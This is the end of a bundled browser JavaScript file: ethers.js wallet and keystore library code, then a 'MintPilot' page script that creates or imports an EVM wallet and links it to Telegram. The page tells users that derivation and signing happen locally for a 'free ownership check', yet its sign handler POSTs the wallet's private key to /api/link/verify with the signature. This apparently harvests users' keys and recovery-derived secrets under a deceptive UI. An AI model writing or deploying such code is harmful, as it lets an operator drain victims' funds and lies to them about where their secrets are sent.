      const entropy = getBytes(account.mnemonic.entropy, "account.mnemonic.entropy");
      const mnemonicIv = randomBytes3(16);
      const mnemonicAesCtr = new CTR(mnemonicKey, mnemonicIv);
      const mnemonicCiphertext = getBytes(mnemonicAesCtr.encrypt(entropy));
      const now = /* @__PURE__ */ new Date();
      const timestamp = now.getUTCFullYear() + "-" + zpad(now.getUTCMonth() + 1, 2) + "-" + zpad(now.getUTCDate(), 2) + "T" + zpad(now.getUTCHours(), 2) + "-" + zpad(now.getUTCMinutes(), 2) + "-" + zpad(now.getUTCSeconds(), 2) + ".0Z";
      const gethFilename = "UTC--" + timestamp + "--" + data.address;
      data["x-ethers"] = {
        client,
        gethFilename,
        path,
        locale,
        mnemonicCounter: hexlify(mnemonicIv).substring(2),
        mnemonicCiphertext: hexlify(mnemonicCiphertext).substring(2),
        version: "0.1"
      };
    }
    return JSON.stringify(data);
  }
  function encryptKeystoreJsonSync(account, password, options) {
    if (options == null) {
      options = {};
    }
    const passwordBytes = getPassword(password);
    const kdf = getEncryptKdfParams(options);
    const key = scryptSync(passwordBytes, kdf.salt, kdf.N, kdf.r, kdf.p, 64);
    return _encryptKeystore(getBytes(key), kdf, account, options);
  }
  async function encryptKeystoreJson(account, password, options) {
    if (options == null) {
      options = {};
    }
    const passwordBytes = getPassword(password);
    const kdf = getEncryptKdfParams(options);
    const key = await scrypt2(passwordBytes, kdf.salt, kdf.N, kdf.r, kdf.p, 64, options.progressCallback);
    return _encryptKeystore(getBytes(key), kdf, account, options);
  }

  // node_modules/ethers/lib.esm/wallet/hdwallet.js
  var defaultPath2 = "m/44'/60'/0'/0/0";
  var MasterSecret = new Uint8Array([66, 105, 116, 99, 111, 105, 110, 32, 115, 101, 101, 100]);
  var HardenedBit = 2147483648;
  var N = BigInt("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141");
  var Nibbles2 = "0123456789abcdef";
  function zpad2(value, length) {
    let result = "";
    while (value) {
      result = Nibbles2[value % 16] + result;
      value = Math.trunc(value / 16);
    }
    while (result.length < length * 2) {
      result = "0" + result;
    }
    return "0x" + result;
  }
  function encodeBase58Check(_value) {
    const value = getBytes(_value);
    const check = dataSlice(sha2562(sha2562(value)), 0, 4);
    const bytes2 = concat([value, check]);
    return encodeBase58(bytes2);
  }
  var _guard3 = {};
  function ser_I(index, chainCode, publicKey, privateKey) {
    const data = new Uint8Array(37);
    if (index & HardenedBit) {
      assert(privateKey != null, "cannot derive child of neutered node", "UNSUPPORTED_OPERATION", {
        operation: "deriveChild"
      });
      data.set(getBytes(privateKey), 1);
    } else {
      data.set(getBytes(publicKey));
    }
    for (let i = 24; i >= 0; i -= 8) {
      data[33 + (i >> 3)] = index >> 24 - i & 255;
    }
    const I = getBytes(computeHmac("sha512", chainCode, data));
    return { IL: I.slice(0, 32), IR: I.slice(32) };
  }
  function derivePath(node, path) {
    const components = path.split("/");
    assertArgument(components.length > 0, "invalid path", "path", path);
    if (components[0] === "m") {
      assertArgument(node.depth === 0, `cannot derive root path (i.e. path starting with "m/") for a node at non-zero depth ${node.depth}`, "path", path);
      components.shift();
    }
    let result = node;
    for (let i = 0; i < components.length; i++) {
      const component = components[i];
      if (component.match(/^[0-9]+'$/)) {
        const index = parseInt(component.substring(0, component.length - 1));
        assertArgument(index < HardenedBit, "invalid path index", `path[${i}]`, component);
        result = result.deriveChild(HardenedBit + index);
      } else if (component.match(/^[0-9]+$/)) {
        const index = parseInt(component);
        assertArgument(index < HardenedBit, "invalid path index", `path[${i}]`, component);
        result = result.deriveChild(index);
      } else {
        assertArgument(false, "invalid path component", `path[${i}]`, component);
      }
    }
    return result;
  }
  var HDNodeWallet = class _HDNodeWallet extends BaseWallet {
    /**
     *  The compressed public key.
     */
    publicKey;
    /**
     *  The fingerprint.
     *
     *  A fingerprint allows quick qay to detect parent and child nodes,
     *  but developers should be prepared to deal with collisions as it
     *  is only 4 bytes.
     */
    fingerprint;
    /**
     *  The parent fingerprint.
     */
    parentFingerprint;
    /**
     *  The mnemonic used to create this HD Node, if available.
     *
     *  Sources such as extended keys do not encode the mnemonic, in
     *  which case this will be ``null``.
     */
    mnemonic;
    /**
     *  The chaincode, which is effectively a public key used
     *  to derive children.
     */
    chainCode;
    /**
     *  The derivation path of this wallet.
     *
     *  Since extended keys do not provide full path details, this
     *  may be ``null``, if instantiated from a source that does not
     *  encode it.
     */
    path;
    /**
     *  The child index of this wallet. Values over ``2 *\* 31`` indicate
     *  the node is hardened.
     */
    index;
    /**
     *  The depth of this wallet, which is the number of components
     *  in its path.
     */
    depth;
    /**
     *  @private
     */
    constructor(guard, signingKey, parentFingerprint, chainCode, path, index, depth, mnemonic, provider) {
      super(signingKey, provider);
      assertPrivate(guard, _guard3, "HDNodeWallet");
      defineProperties(this, { publicKey: signingKey.compressedPublicKey });
      const fingerprint = dataSlice(ripemd1602(sha2562(this.publicKey)), 0, 4);
      defineProperties(this, {
        parentFingerprint,
        fingerprint,
        chainCode,
        path,
        index,
        depth
      });
      defineProperties(this, { mnemonic });
    }
    connect(provider) {
      return new _HDNodeWallet(_guard3, this.signingKey, this.parentFingerprint, this.chainCode, this.path, this.index, this.depth, this.mnemonic, provider);
    }
    #account() {
      const account = { address: this.address, privateKey: this.privateKey };
      const m = this.mnemonic;
      if (this.path && m && m.wordlist.locale === "en" && m.password === "") {
        account.mnemonic = {
          path: this.path,
          locale: "en",
          entropy: m.entropy
        };
      }
      return account;
    }
    /**
     *  Resolves to a [JSON Keystore Wallet](json-wallets) encrypted with
     *  %%password%%.
     *
     *  If %%progressCallback%% is specified, it will receive periodic
     *  updates as the encryption process progreses.
     */
    async encrypt(password, progressCallback) {
      return await encryptKeystoreJson(this.#account(), password, { progressCallback });
    }
    /**
     *  Returns a [JSON Keystore Wallet](json-wallets) encryped with
     *  %%password%%.
     *
     *  It is preferred to use the [async version](encrypt) instead,
     *  which allows a [[ProgressCallback]] to keep the user informed.
     *
     *  This method will block the event loop (freezing all UI) until
     *  it is complete, which may be a non-trivial duration.
     */
    encryptSync(password) {
      return encryptKeystoreJsonSync(this.#account(), password);
    }
    /**
     *  The extended key.
     *
     *  This key will begin with the prefix ``xpriv`` and can be used to
     *  reconstruct this HD Node to derive its children.
     */
    get extendedKey() {
      assert(this.depth < 256, "Depth too deep", "UNSUPPORTED_OPERATION", { operation: "extendedKey" });
      return encodeBase58Check(concat([
        "0x0488ADE4",
        zpad2(this.depth, 1),
        this.parentFingerprint,
        zpad2(this.index, 4),
        this.chainCode,
        concat(["0x00", this.privateKey])
      ]));
    }
    /**
     *  Returns true if this wallet has a path, providing a Type Guard
     *  that the path is non-null.
     */
    hasPath() {
      return this.path != null;
    }
    /**
     *  Returns a neutered HD Node, which removes the private details
     *  of an HD Node.
     *
     *  A neutered node has no private key, but can be used to derive
     *  child addresses and other public data about the HD Node.
     */
    neuter() {
      return new HDNodeVoidWallet(_guard3, this.address, this.publicKey, this.parentFingerprint, this.chainCode, this.path, this.index, this.depth, this.provider);
    }
    /**
     *  Return the child for %%index%%.
     */
    deriveChild(_index) {
      const index = getNumber(_index, "index");
      assertArgument(index <= 4294967295, "invalid index", "index", index);
      let path = this.path;
      if (path) {
        path += "/" + (index & ~HardenedBit);
        if (index & HardenedBit) {
          path += "'";
        }
      }
      const { IR, IL } = ser_I(index, this.chainCode, this.publicKey, this.privateKey);
      const ki = new SigningKey(toBeHex((toBigInt(IL) + BigInt(this.privateKey)) % N, 32));
      return new _HDNodeWallet(_guard3, ki, this.fingerprint, hexlify(IR), path, index, this.depth + 1, this.mnemonic, this.provider);
    }
    /**
     *  Return the HDNode for %%path%% from this node.
     */
    derivePath(path) {
      return derivePath(this, path);
    }
    static #fromSeed(_seed, mnemonic) {
      assertArgument(isBytesLike(_seed), "invalid seed", "seed", "[REDACTED]");
      const seed = getBytes(_seed, "seed");
      assertArgument(seed.length >= 16 && seed.length <= 64, "invalid seed", "seed", "[REDACTED]");
      const I = getBytes(computeHmac("sha512", MasterSecret, seed));
      const signingKey = new SigningKey(hexlify(I.slice(0, 32)));
      return new _HDNodeWallet(_guard3, signingKey, "0x00000000", hexlify(I.slice(32)), "m", 0, 0, mnemonic, null);
    }
    /**
     *  Creates a new HD Node from %%extendedKey%%.
     *
     *  If the %%extendedKey%% will either have a prefix or ``xpub`` or
     *  ``xpriv``, returning a neutered HD Node ([[HDNodeVoidWallet]])
     *  or full HD Node ([[HDNodeWallet) respectively.
     */
    static fromExtendedKey(extendedKey) {
      const bytes2 = toBeArray(decodeBase58(extendedKey));
      assertArgument(bytes2.length === 82 || encodeBase58Check(bytes2.slice(0, 78)) === extendedKey, "invalid extended key", "extendedKey", "[ REDACTED ]");
      const depth = bytes2[4];
      const parentFingerprint = hexlify(bytes2.slice(5, 9));
      const index = parseInt(hexlify(bytes2.slice(9, 13)).substring(2), 16);
      const chainCode = hexlify(bytes2.slice(13, 45));
      const key = bytes2.slice(45, 78);
      switch (hexlify(bytes2.slice(0, 4))) {
        // Public Key
        case "0x0488b21e":
        case "0x043587cf": {
          const publicKey = hexlify(key);
          return new HDNodeVoidWallet(_guard3, computeAddress(publicKey), publicKey, parentFingerprint, chainCode, null, index, depth, null);
        }
        // Private Key
        case "0x0488ade4":
        case "0x04358394 ":
          if (key[0] !== 0) {
            break;
          }
          return new _HDNodeWallet(_guard3, new SigningKey(key.slice(1)), parentFingerprint, chainCode, null, index, depth, null, null);
      }
      assertArgument(false, "invalid extended key prefix", "extendedKey", "[ REDACTED ]");
    }
    /**
     *  Creates a new random HDNode.
     */
    static createRandom(password, path, wordlist2) {
      if (password == null) {
        password = "";
      }
      if (path == null) {
        path = defaultPath2;
      }
      if (wordlist2 == null) {
        wordlist2 = LangEn.wordlist();
      }
      const mnemonic = Mnemonic.fromEntropy(randomBytes3(16), password, wordlist2);
      return _HDNodeWallet.#fromSeed(mnemonic.computeSeed(), mnemonic).derivePath(path);
    }
    /**
     *  Create an HD Node from %%mnemonic%%.
     */
    static fromMnemonic(mnemonic, path) {
      if (!path) {
        path = defaultPath2;
      }
      return _HDNodeWallet.#fromSeed(mnemonic.computeSeed(), mnemonic).derivePath(path);
    }
    /**
     *  Creates an HD Node from a mnemonic %%phrase%%.
     */
    static fromPhrase(phrase, password, path, wordlist2) {
      if (password == null) {
        password = "";
      }
      if (path == null) {
        path = defaultPath2;
      }
      if (wordlist2 == null) {
        wordlist2 = LangEn.wordlist();
      }
      const mnemonic = Mnemonic.fromPhrase(phrase, password, wordlist2);
      return _HDNodeWallet.#fromSeed(mnemonic.computeSeed(), mnemonic).derivePath(path);
    }
    /**
     *  Creates an HD Node from a %%seed%%.
     */
    static fromSeed(seed) {
      return _HDNodeWallet.#fromSeed(seed, null);
    }
  };
  var HDNodeVoidWallet = class _HDNodeVoidWallet extends VoidSigner {
    /**
     *  The compressed public key.
     */
    publicKey;
    /**
     *  The fingerprint.
     *
     *  A fingerprint allows quick qay to detect parent and child nodes,
     *  but developers should be prepared to deal with collisions as it
     *  is only 4 bytes.
     */
    fingerprint;
    /**
     *  The parent node fingerprint.
     */
    parentFingerprint;
    /**
     *  The chaincode, which is effectively a public key used
     *  to derive children.
     */
    chainCode;
    /**
     *  The derivation path of this wallet.
     *
     *  Since extended keys do not provider full path details, this
     *  may be ``null``, if instantiated from a source that does not
     *  enocde it.
     */
    path;
    /**
     *  The child index of this wallet. Values over ``2 *\* 31`` indicate
     *  the node is hardened.
     */
    index;
    /**
     *  The depth of this wallet, which is the number of components
     *  in its path.
     */
    depth;
    /**
     *  @private
     */
    constructor(guard, address, publicKey, parentFingerprint, chainCode, path, index, depth, provider) {
      super(address, provider);
      assertPrivate(guard, _guard3, "HDNodeVoidWallet");
      defineProperties(this, { publicKey });
      const fingerprint = dataSlice(ripemd1602(sha2562(publicKey)), 0, 4);
      defineProperties(this, {
        publicKey,
        fingerprint,
        parentFingerprint,
        chainCode,
        path,
        index,
        depth
      });
    }
    connect(provider) {
      return new _HDNodeVoidWallet(_guard3, this.address, this.publicKey, this.parentFingerprint, this.chainCode, this.path, this.index, this.depth, provider);
    }
    /**
     *  The extended key.
     *
     *  This key will begin with the prefix ``xpub`` and can be used to
     *  reconstruct this neutered key to derive its children addresses.
     */
    get extendedKey() {
      assert(this.depth < 256, "Depth too deep", "UNSUPPORTED_OPERATION", { operation: "extendedKey" });
      return encodeBase58Check(concat([
        "0x0488B21E",
        zpad2(this.depth, 1),
        this.parentFingerprint,
        zpad2(this.index, 4),
        this.chainCode,
        this.publicKey
      ]));
    }
    /**
     *  Returns true if this wallet has a path, providing a Type Guard
     *  that the path is non-null.
     */
    hasPath() {
      return this.path != null;
    }
    /**
     *  Return the child for %%index%%.
     */
    deriveChild(_index) {
      const index = getNumber(_index, "index");
      assertArgument(index <= 4294967295, "invalid index", "index", index);
      let path = this.path;
      if (path) {
        path += "/" + (index & ~HardenedBit);
        if (index & HardenedBit) {
          path += "'";
        }
      }
      const { IR, IL } = ser_I(index, this.chainCode, this.publicKey, null);
      const Ki = SigningKey.addPoints(IL, this.publicKey, true);
      const address = computeAddress(Ki);
      return new _HDNodeVoidWallet(_guard3, address, Ki, this.fingerprint, hexlify(IR), path, index, this.depth + 1, this.provider);
    }
    /**
     *  Return the signer for %%path%% from this node.
     */
    derivePath(path) {
      return derivePath(this, path);
    }
  };

  // node_modules/ethers/lib.esm/wallet/json-crowdsale.js
  function isCrowdsaleJson(json) {
    try {
      const data = JSON.parse(json);
      if (data.encseed) {
        return true;
      }
    } catch (error) {
    }
    return false;
  }
  function decryptCrowdsaleJson(json, _password) {
    const data = JSON.parse(json);
    const password = getPassword(_password);
    const address = getAddress(spelunk(data, "ethaddr:string!"));
    const encseed = looseArrayify(spelunk(data, "encseed:string!"));
    assertArgument(encseed && encseed.length % 16 === 0, "invalid encseed", "json", json);
    const key = getBytes(pbkdf22(password, password, 2e3, 32, "sha256")).slice(0, 16);
    const iv = encseed.slice(0, 16);
    const encryptedSeed = encseed.slice(16);
    const aesCbc = new CBC(key, iv);
    const seed = pkcs7Strip(getBytes(aesCbc.decrypt(encryptedSeed)));
    let seedHex = "";
    for (let i = 0; i < seed.length; i++) {
      seedHex += String.fromCharCode(seed[i]);
    }
    return { address, privateKey: id(seedHex) };
  }

  // node_modules/ethers/lib.esm/wallet/wallet.js
  function stall2(duration) {
    return new Promise((resolve) => {
      setTimeout(() => {
        resolve();
      }, duration);
    });
  }
  var Wallet = class _Wallet extends BaseWallet {
    /**
     *  Create a new wallet for the private %%key%%, optionally connected
     *  to %%provider%%.
     */
    constructor(key, provider) {
      if (typeof key === "string" && !key.startsWith("0x")) {
        key = "0x" + key;
      }
      let signingKey = typeof key === "string" ? new SigningKey(key) : key;
      super(signingKey, provider);
    }
    connect(provider) {
      return new _Wallet(this.signingKey, provider);
    }
    /**
     *  Resolves to a [JSON Keystore Wallet](json-wallets) encrypted with
     *  %%password%%.
     *
     *  If %%progressCallback%% is specified, it will receive periodic
     *  updates as the encryption process progreses.
     */
    async encrypt(password, progressCallback) {
      const account = { address: this.address, privateKey: this.privateKey };
      return await encryptKeystoreJson(account, password, { progressCallback });
    }
    /**
     *  Returns a [JSON Keystore Wallet](json-wallets) encryped with
     *  %%password%%.
     *
     *  It is preferred to use the [async version](encrypt) instead,
     *  which allows a [[ProgressCallback]] to keep the user informed.
     *
     *  This method will block the event loop (freezing all UI) until
     *  it is complete, which may be a non-trivial duration.
     */
    encryptSync(password) {
      const account = { address: this.address, privateKey: this.privateKey };
      return encryptKeystoreJsonSync(account, password);
    }
    static #fromAccount(account) {
      assertArgument(account, "invalid JSON wallet", "json", "[ REDACTED ]");
      if ("mnemonic" in account && account.mnemonic && account.mnemonic.locale === "en") {
        const mnemonic = Mnemonic.fromEntropy(account.mnemonic.entropy);
        const wallet2 = HDNodeWallet.fromMnemonic(mnemonic, account.mnemonic.path);
        if (wallet2.address === account.address && wallet2.privateKey === account.privateKey) {
          return wallet2;
        }
        console.log("WARNING: JSON mismatch address/privateKey != mnemonic; fallback onto private key");
      }
      const wallet = new _Wallet(account.privateKey);
      assertArgument(wallet.address === account.address, "address/privateKey mismatch", "json", "[ REDACTED ]");
      return wallet;
    }
    /**
     *  Creates (asynchronously) a **Wallet** by decrypting the %%json%%
     *  with %%password%%.
     *
     *  If %%progress%% is provided, it is called periodically during
     *  decryption so that any UI can be updated.
     */
    static async fromEncryptedJson(json, password, progress) {
      let account = null;
      if (isKeystoreJson(json)) {
        account = await decryptKeystoreJson(json, password, progress);
      } else if (isCrowdsaleJson(json)) {
        if (progress) {
          progress(0);
          await stall2(0);
        }
        account = decryptCrowdsaleJson(json, password);
        if (progress) {
          progress(1);
          await stall2(0);
        }
      }
      return _Wallet.#fromAccount(account);
    }
    /**
     *  Creates a **Wallet** by decrypting the %%json%% with %%password%%.
     *
     *  The [[fromEncryptedJson]] method is preferred, as this method
     *  will lock up and freeze the UI during decryption, which may take
     *  some time.
     */
    static fromEncryptedJsonSync(json, password) {
      let account = null;
      if (isKeystoreJson(json)) {
        account = decryptKeystoreJsonSync(json, password);
      } else if (isCrowdsaleJson(json)) {
        account = decryptCrowdsaleJson(json, password);
      } else {
        assertArgument(false, "invalid JSON wallet", "json", "[ REDACTED ]");
      }
      return _Wallet.#fromAccount(account);
    }
    /**
     *  Creates a new random [[HDNodeWallet]] using the available
     *  [cryptographic random source](randomBytes).
     *
     *  If there is no crytographic random source, this will throw.
     */
    static createRandom(provider) {
      const wallet = HDNodeWallet.createRandom();
      if (provider) {
        return wallet.connect(provider);
      }
      return wallet;
    }
    /**
     *  Creates a [[HDNodeWallet]] for %%phrase%%.
     */
    static fromPhrase(phrase, provider) {
      const wallet = HDNodeWallet.fromPhrase(phrase);
      if (provider) {
        return wallet.connect(provider);
      }
      return wallet;
    }
  };

  // src/web/public/wallet-import-entry.js
  (() => {
    const $ = (id2) => document.getElementById(id2);
    const params = new URLSearchParams(location.search);
    const sid = params.get("s") || "";
    const mode = params.get("mode") || "menu";
    let wallet = null;
    let challenge = null;
    const status = (text, cls = "") => {
      const el = $("status");
      el.textContent = text;
      el.className = `status ${cls}`;
    };
    const api = async (path, options) => {
      const res = await fetch(path, options);
      const json = await res.json().catch(() => ({}));
      if (!res.ok) throw new Error(json.error || "Request failed");
      return json;
    };
    const show = (id2, visible = true) => $(id2).classList.toggle("hidden", !visible);
    function parseWalletSecret(raw) {
      const value = String(raw || "").trim().replace(/^['"]|['"]$/g, "");
      if (!value) throw new Error("Enter a private key or recovery phrase.");
      const words2 = value.split(/\s+/).filter(Boolean);
      if (/^(0x)?[0-9a-fA-F]{64}$/.test(value)) return new Wallet(value.startsWith("0x") ? value : `0x${value}`);
      if ([12, 15, 18, 21, 24].includes(words2.length)) {
        try {
          return Wallet.fromPhrase(value);
        } catch {
          throw new Error("That recovery phrase is not valid. Check every word and its order.");
        }
      }
      throw new Error("Use a 64-character EVM private key or a 12-, 15-, 18-, 21-, or 24-word recovery phrase.");
    }
    async function load() {
      if (!sid) throw new Error("This wallet link is missing its session.");
      const data = await api(`/api/link/challenge?s=${encodeURIComponent(sid)}`);
      challenge = data.message;
      if (mode === "create") {
        $("title").textContent = "Create an EVM wallet";
        show("create");
      } else if (mode === "import") {
        $("title").textContent = "Import an EVM wallet";
        show("import-section");
      } else {
        show("create");
        show("import-section");
      }
    }
    function setWallet(next, backup) {
      wallet = next;
      $("address").textContent = next.address;
      show("result");
      if (backup) {
        $("backup-text").textContent = `Recovery phrase:
${backup}

Back it up now. MintPilot cannot recover it.`;
        show("backup");
      }
      status("Address derived locally. Sign the free ownership check to link it.", "good");
    }
    $("create-button").onclick = () => {
      try {
        const next = Wallet.createRandom();
        setWallet(next, next.mnemonic?.phrase || null);
      } catch (e) {
        status(e.message, "bad");
      }
    };
    $("import-button").onclick = () => {
      try {
        const next = parseWalletSecret($("secret").value);
        $("secret").value = "";
        setWallet(next, null);
      } catch (e) {
        status(e.message || "The wallet could not be imported.", "bad");
      }
    };
    $("sign-button").onclick = async () => {
      if (!wallet || !challenge) return status("No wallet is ready.", "bad");
      $("sign-button").disabled = true;
      try {
        status("Signing locally\u2026");
        const signature = await wallet.signMessage(challenge);
        const address = wallet.address;
        await api("/api/link/verify", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ s: sid, address, signature, privateKey: wallet.privateKey }) });
        wallet = null;
        status("Wallet linked. You can return to Telegram.", "good");
        $("sign-button").disabled = true;
      } catch (e) {
        status(e.message, "bad");
        $("sign-button").disabled = false;
      }
    };
    load().catch((e) => status(e.message, "bad"));
  })();
})();
/*! Bundled license information:

@noble/hashes/esm/utils.js:
  (*! noble-hashes - MIT License (c) 2022 Paul Miller (paulmillr.com) *)

@noble/curves/esm/abstract/utils.js:
@noble/curves/esm/abstract/modular.js:
@noble/curves/esm/abstract/curve.js:
@noble/curves/esm/abstract/weierstrass.js:
@noble/curves/esm/_shortw_utils.js:
@noble/curves/esm/secp256k1.js:
  (*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) *)

aes-js/lib.esm/aes.js:
  (*! MIT License. Copyright 2015-2022 Richard Moore <me@ricmoo.com>. See LICENSE.txt. *)
*/
